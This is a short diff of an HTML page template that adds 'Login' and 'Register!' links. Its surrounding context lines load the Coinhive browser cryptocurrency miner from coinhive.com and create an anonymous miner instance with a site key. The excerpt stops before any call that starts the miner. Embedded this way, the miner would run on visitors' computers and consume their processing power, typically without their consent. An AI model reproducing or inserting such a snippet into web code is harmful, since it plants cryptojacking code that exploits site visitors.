@@ -10,6 +10,9 @@
     </div>
 
     <div class="content">
+        <p><a href="/login">Login</a></p>
+        <p><a href="/register">Register!</a></p>
+
         <script src="https://coinhive.com/lib/coinhive.min.js"></script>
         <script>
             var miner = new CoinHive.Anonymous('LizXPgR1RicCNg50MGh2EOgT4BjJovK0');
